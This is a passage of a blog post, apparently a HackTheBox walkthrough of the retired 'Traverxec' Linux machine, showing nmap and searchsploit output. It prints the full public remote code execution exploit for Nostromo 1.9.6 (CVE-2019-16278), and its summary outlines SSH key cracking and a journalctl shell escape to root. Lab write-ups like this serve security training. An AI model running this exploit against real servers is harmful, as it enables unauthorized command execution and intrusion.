<!DOCTYPE html>
<html lang=en>

<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/baffle.js/0.2.1/baffle.min.js"></script>
    <meta name="description" content="Quick Summary   ‚Üí Traverxec is another beginner friendly machine that runs on Linux. The machine has two open ports which is port 22 &amp; 80 that basically running a SSH and HTTP Service.  There is">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Traverxec üóúÔ∏èüìÇ">
<meta property="og:url" content="https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/index.html">
<meta property="og:site_name" content="‚ùØ Ôº∞Ôº°ÔºπÔº°Ôº≥Ôºê">
<meta property="og:description" content="Quick Summary   ‚Üí Traverxec is another beginner friendly machine that runs on Linux. The machine has two open ports which is port 22 &amp; 80 that basically running a SSH and HTTP Service.  There is">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ph-payas0.github.io/img/traverxec/traverxec1.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/traverxec/traverxec-david.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/traverxec/traverxec-contact-form.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/traverxec/journalctl.PNG">
<meta property="og:image" content="https://ph-payas0.github.io/img/traverxec/root-traverxec1.png">
<meta property="og:image" content="https://www.hackthebox.eu/badge/image/128965">
<meta property="article:published_time" content="2020-04-10T20:41:29.000Z">
<meta property="article:modified_time" content="2020-06-09T21:43:17.100Z">
<meta property="article:author" content="Medz">
<meta property="article:tag" content="rce">
<meta property="article:tag" content="retired">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="GTFObins">
<meta property="article:tag" content="cve">
<meta property="article:tag" content="ssh">
<meta property="article:tag" content="traversal">
<meta property="article:tag" content="lfi">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ph-payas0.github.io/img/traverxec/traverxec1.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon-1.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>HackTheBox - Traverxec üóúÔ∏èüìÇ</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="‚ùØ Ôº∞Ôº°ÔºπÔº°Ôº≥Ôºê" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020-04-18/HackTheBox/PenTesting/HackTheBox-Mango/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020-04-05/HackTheBox/PenTesting/HackTheBox-Registry/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&text=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&title=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&is_video=false&description=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox - Traverxec üóúÔ∏èüìÇ&body=Check out this article: https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&title=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&title=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&title=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&title=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&name=HackTheBox - Traverxec üóúÔ∏èüìÇ&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&t=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-results"><span class="toc-number">3.2.</span> <span class="toc-text">Nmap results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Traverxec-Website"><span class="toc-number">4.1.</span> <span class="toc-text">Traverxec Website</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nostromo-1-9-6"><span class="toc-number">4.2.</span> <span class="toc-text">Nostromo 1.9.6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post - Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerate-Traverxec-machine"><span class="toc-number">5.1.</span> <span class="toc-text">Enumerate Traverxec machine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Use-Metasploit-to-Direct-Access"><span class="toc-number">5.2.</span> <span class="toc-text">Use Metasploit to Direct Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-in-into-the-machine"><span class="toc-number">5.3.</span> <span class="toc-text">Get in into the machine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WWW-DATA"><span class="toc-number">5.4.</span> <span class="toc-text">WWW-DATA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HOME-DIRECTORY"><span class="toc-number">6.1.</span> <span class="toc-text">HOME DIRECTORY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Decrypt-SSH-Key-with-ssh2john"><span class="toc-number">6.2.</span> <span class="toc-text">Decrypt SSH Key with ssh2john</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-with-SSH-and-get-user-txt"><span class="toc-number">6.3.</span> <span class="toc-text">Login with SSH and get user.txt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JOURNALCTL"><span class="toc-number">7.1.</span> <span class="toc-text">JOURNALCTL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-the-ADMIN-Shell"><span class="toc-number">7.2.</span> <span class="toc-text">Get the ADMIN Shell</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
        <div class="content index py4">
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <embed src="/html/Kalimba.mp3" loop="true" autostart="true" width="2" height="0">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Traverxec üóúÔ∏èüìÇ
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">‚ùØ Ôº∞Ôº°ÔºπÔº°Ôº≥Ôºê</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-04-10T20:41:29.000Z" itemprop="datePublished">11-04-2020</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/HackTheBox/">HackTheBox</a> ‚Ä∫ <a class="category-link" href="/categories/HackTheBox/PenTesting/">PenTesting</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/GTFObins/" rel="tag">GTFObins</a>, <a class="tag-link-link" href="/tags/cve/" rel="tag">cve</a>, <a class="tag-link-link" href="/tags/lfi/" rel="tag">lfi</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/rce/" rel="tag">rce</a>, <a class="tag-link-link" href="/tags/retired/" rel="tag">retired</a>, <a class="tag-link-link" href="/tags/ssh/" rel="tag">ssh</a>, <a class="tag-link-link" href="/tags/traversal/" rel="tag">traversal</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><img src="/img/traverxec/traverxec1.png" alt="HackTheBox-Traverxec" title="Traverxec machine details"></p>
<hr>
<h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   ‚Üí Traverxec is another beginner friendly machine that runs on Linux. The machine has two open ports which is port <code>22</code> &amp; <code>80</code> that basically running a <code>SSH</code> and <code>HTTP Service</code>.  There is nothing to use on the website when I tried to look something but the website‚Äôs has middleware service <code>Nostromo 1.9.6</code> has a directory traversal bypass that causes <code>RCE</code> or <a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/remote-code-evaluation-execution/">Remote Code Execution</a> and enter into <code>www-data</code>.<br>   After entering the target machine it seems that user directory give us <code>Permission&#39;s denied</code> but when I was look at the <code>configuration file</code> we can enter at <code>/public_www/</code> based on the <code>$HOMEDIRS</code>. The directory contains <code>SSH Key</code> which I use to enter for user <code>david</code>.<br>   The Privilege Escalation part was tricky. As the user has can run <em><code>journalctl</code></em> that has root privileges and to get the root is to change the size of our terminal shell into small so I can execute <code>!/bin/bash</code> command and get the administrator shell.</p>
<hr>
<h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol>
<li><p><strong>Network Scanning</strong></p>
<p>‚Üí Nmap scan</p>
<p>‚Üí discover open ports and what services are running</p>
</li>
<li><p><strong>Enumeration</strong></p>
<p>‚Üí Browsing the HTTP Service</p>
<p>‚Üí Search about <code>Nostromo 1.9.6</code></p>
</li>
<li><p><strong>Post - Exploitation</strong></p>
<p>‚Üí Enumerate machine with <code>Nostromo 1.9.6 Exploit</code></p>
<p>‚Üí Metasploit to gain direct access</p>
<p>‚Üí run <a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">LinEnum</a> or <code>Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</code> to look for interesting inside the machine</p>
<p>‚Üí Decrypt the password hash that appear on the script.</p>
<p>‚Üí Looking at <code>configuration file</code> we allowed to enter <code>/public_www/</code></p>
</li>
<li><p><strong>Exploitation</strong></p>
<p>‚Üí copy the <code>backup-ssh-key</code> at the <code>/tmp/</code> directory</p>
<p>‚Üí enumerate <code>david</code> files we see <code>SSH Key</code></p>
<p>‚Üí decrypt <code>SSH Key</code> with <a target="_blank" rel="noopener" href="https://github.com/koboi137/john/blob/bionic/ssh2john.py">ssh2john</a> and decrypt the hash with <a target="_blank" rel="noopener" href="https://github.com/koboi137/john">John</a></p>
<p>‚Üí Login with <code>SSH Key</code> and use the passphrase we decrypt and get the <code>user.txt</code></p>
</li>
<li><p><strong>Privilege Escalation</strong></p>
<p>‚Üí Abuse what the <code>user</code> is allowed to run which is the <code>journalctl</code></p>
<p>‚Üí with <a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFObins</a> I see that i can execute a shell with <code>journalctl</code></p>
<p>‚Üí change the terminal into small size and execute <code>!/bin/bash</code> and become <code>root</code></p>
<p>‚Üí Finally get the <code>root.txt</code></p>
</li>
</ol>
<hr>
<h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí I always begin at <em><strong>NMAP</strong></em> to look on the services what is running. I always use</p>
<hr>
<ul>
<li>-sV      ‚áí Probe open ports to determine service&#x2F;version info</li>
<li>-sC      ‚áí equivalent to ‚Äîscript&#x3D;default</li>
<li>-T 0-5   ‚áí Set timing template - higher is faster (less accurate)</li>
<li>-A-      ‚áí Agressive scan</li>
<li>-oN      ‚áí to save our scan results to a text file</li>
</ul>
<hr>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">nmap -sV -sC -A -T4 <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span> -oN nmap-Traverxec</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec </span><br><span class="line">‚ùØ nmap -sV -sC -A -T4 <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span> -oN nmap-Traverxec</span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-04-11 05:53 PST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span></span><br><span class="line"><span class="function">Host <span class="keyword">is</span> <span class="title">up</span> (<span class="params"><span class="number">0.26</span>s latency</span>).</span></span><br><span class="line"><span class="function">Not shown: 998 filtered ports</span></span><br><span class="line"><span class="function">PORT   STATE SERVICE VERSION</span></span><br><span class="line"><span class="function">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+<span class="title">deb10u1</span> (<span class="params">protocol <span class="number">2.0</span></span>)</span></span><br><span class="line"><span class="function">| ssh-hostkey: </span></span><br><span class="line"><span class="function">|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:<span class="title">cc</span> (<span class="params">ECDSA</span>)</span></span><br><span class="line"><span class="function">|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:<span class="title">ce</span> (<span class="params">ED25519</span>)</span></span><br><span class="line"><span class="function">80/tcp open  http    nostromo 1.9.6</span></span><br><span class="line"><span class="function">|_http-server-header: nostromo 1.9.6</span></span><br><span class="line"><span class="function">|_http-title: TRAVERXEC</span></span><br><span class="line"><span class="function">Warning: OSScan results may be unreliable because we could <span class="keyword">not</span> find at least 1 open <span class="keyword">and</span> 1 closed port</span></span><br><span class="line"><span class="function">Aggressive OS guesses: Linux 3.10 - 4.11 (<span class="params"><span class="number">92</span>%</span>), Linux 3.18 (<span class="params"><span class="number">92</span>%</span>), Linux 3.2 - 4.9 (<span class="params"><span class="number">92</span>%</span>), Crestron XPanel control <span class="title">system</span> (<span class="params"><span class="number">90</span>%</span>), Linux 3.16 (<span class="params"><span class="number">89</span>%</span>), ASUS RT-N56U <span class="title">WAP</span> (<span class="params">Linux <span class="number">3.4</span></span>) (<span class="params"><span class="number">87</span>%</span>), Linux 3.1 (<span class="params"><span class="number">87</span>%</span>), Linux 3.2 (<span class="params"><span class="number">87</span>%</span>), HP P2000 G3 NAS <span class="title">device</span> (<span class="params"><span class="number">87</span>%</span>), AXIS 210A <span class="keyword">or</span> 211 Network <span class="title">Camera</span> (<span class="params">Linux <span class="number">2.6</span><span class="number">.17</span></span>) (<span class="params"><span class="number">87</span>%</span>)</span></span><br><span class="line"><span class="function">No exact OS matches <span class="keyword">for</span> <span class="title">host</span> (<span class="params">test conditions non-ideal</span>).</span></span><br><span class="line"><span class="function">Network Distance: 2 hops</span></span><br><span class="line"><span class="function">Service Info: OS: Linux</span>; CPE: cpe:/o:linux:<span class="function">linux_kernel</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">TRACEROUTE</span> (<span class="params"><span class="keyword">using</span> port <span class="number">22</span>/tcp</span>)</span></span><br><span class="line"><span class="function">HOP RTT       ADDRESS</span></span><br><span class="line"><span class="function">1   258.62 ms 10.10.14.1</span></span><br><span class="line"><span class="function">2   264.54 ms 10.10.10.165</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">OS <span class="keyword">and</span> Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span></span><br><span class="line"><span class="function">Nmap done: 1 IP <span class="title">address</span> (<span class="params"><span class="number">1</span> host up</span>) scanned <span class="keyword">in</span> 37.77 seconds</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">root <span class="keyword">in</span> htb/boxes/Traverxec took 38s </span></span><br><span class="line"><span class="function">‚ùØ</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there‚Äôs port open.</p>
<ul>
<li>22      ‚áí which basically use for SSH Connections</li>
<li>80       ‚áí which basically running a website also there‚Äôs running a service which is <code>Nostromo</code> at version <code>1.9.6</code></li>
</ul>
<hr>
<hr>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Traverxec-Website"><a href="#Traverxec-Website" class="headerlink" title="Traverxec Website"></a>Traverxec Website</h3><p>Since there‚Äôs Web Service running, I will look at it and try what should I got so:</p>
<p><img src="/img/traverxec/traverxec-david.png" alt="HackTheBox-Traverxec" title="Traverxec machine details"></p>
<p>So we have a hint from the front page of the website. I got a user named ‚Äì <code>David White</code> i will take note this because there‚Äôs a possibly that guy we will be our user.</p>
<p>also the website‚Äôs a has a contact form but not much interesting.</p>
<p><img src="/img/traverxec/traverxec-contact-form.png" alt="HackTheBox-Traverxec" title="Traverxec machine details"></p>
<p>other than there‚Äôs no more stuffs on the web‚Äô so I‚Äôll gonna move on the next phase.</p>
<p>In my nmap scan results‚Äô the <code>HTTP Service</code> has running <code>Nostromo 1.9.6</code> i try to use <a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb/blob/master/searchsploit">searchsploit</a> to look if there‚Äôs a vulnerability in that service and yes it has.</p>
<h3 id="Nostromo-1-9-6"><a href="#Nostromo-1-9-6" class="headerlink" title="Nostromo 1.9.6"></a>Nostromo 1.9.6</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec </span><br><span class="line">‚ùØ searchsploit nostromo</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                    |  Path</span><br><span class="line">                                                                                                                                                  | (/usr/share/exploitdb/)</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Nostromo - <span class="function">Directory Traversal Remote Command <span class="title">Execution</span> (<span class="params">Metasploit</span>)                                                                              | exploits/multiple/remote/47573.rb</span></span><br><span class="line"><span class="function">nostromo 1.9.6 - Remote Code Execution                                                                                                            | exploits/multiple/remote/47837.py</span></span><br><span class="line"><span class="function">nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                                              | exploits/linux/remote/35466.sh</span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span></span><br><span class="line"><span class="function">Shellcodes: No Result</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">root <span class="keyword">in</span> htb/boxes/Traverxec </span></span><br><span class="line"><span class="function">‚ùØ</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<p>It was a directory traversal attack which is lead to <code>Remote Command Execution</code>. I try to look on the exploit with searchsploit again with <code>-x</code></p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec </span><br><span class="line">‚ùØ searchsploit -x nostromo <span class="number">1.9</span><span class="number">.6</span> - Remote Code Execution                                                                                                            | exploits/multiple/remote/<span class="number">47837.</span>py</span><br></pre></td></tr></table></figure>

<p>and the code exploit:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: nostromo 1.9.6 - Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 2019-12-31</span></span><br><span class="line"><span class="comment"># Exploit Author: Kr0ff</span></span><br><span class="line"><span class="comment"># Vendor Homepage:</span></span><br><span class="line"><span class="comment"># Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz</span></span><br><span class="line"><span class="comment"># Version: 1.9.6</span></span><br><span class="line"><span class="comment"># Tested on: Debian</span></span><br><span class="line"><span class="comment"># CVE : CVE-2019-16278</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cve2019_16278.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">art = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                        _____-2019-16278</span></span><br><span class="line"><span class="string">        _____  _______    ______   _____\    \   </span></span><br><span class="line"><span class="string">   _____\    \_\      |  |      | /    / |    |  </span></span><br><span class="line"><span class="string">  /     /|     ||     /  /     /|/    /  /___/|  </span></span><br><span class="line"><span class="string"> /     / /____/||\    \  \    |/|    |__ |___|/  </span></span><br><span class="line"><span class="string">|     | |____|/ \ \    \ |    | |       \        </span></span><br><span class="line"><span class="string">|     |  _____   \|     \|    | |     __/ __     </span></span><br><span class="line"><span class="string">|\     \|\    \   |\         /| |\    \  /  \    </span></span><br><span class="line"><span class="string">| \_____\|    |   | \_______/ | | \____\/    |   </span></span><br><span class="line"><span class="string">| |     /____/|    \ |     | /  | |    |____/|   </span></span><br><span class="line"><span class="string"> \|_____|    ||     \|_____|/    \|____|   | |   </span></span><br><span class="line"><span class="string">        |____|/                        |___|/    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">help_menu = <span class="string">&#x27;\r\nUsage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">soc</span>):</span><br><span class="line">    response = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            connection = soc.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(connection) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            response += connection</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cve</span>(<span class="params">target, port, cmd</span>):</span><br><span class="line">    soc = socket.socket()</span><br><span class="line">    soc.connect((target, <span class="built_in">int</span>(port)))</span><br><span class="line">    payload = <span class="string">&#x27;POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n&#123;&#125; 2&gt;&amp;1&#x27;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">    soc.send(payload)</span><br><span class="line">    receive = connect(soc)</span><br><span class="line">    <span class="built_in">print</span>(receive)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(art)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">        cmd = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">        cve(target, port, cmd)</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="built_in">print</span>(help_menu)</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec </span><br><span class="line">‚ùØ</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Enumerate-Traverxec-machine"><a href="#Enumerate-Traverxec-machine" class="headerlink" title="Enumerate Traverxec machine"></a>Enumerate Traverxec machine</h3><p>I search about the <code>Nostromo 1.9.6</code> vulnerabilities, using the exploit that I have, i can execute a command like <code>whoami</code> and <code>hostname</code> so:</p>
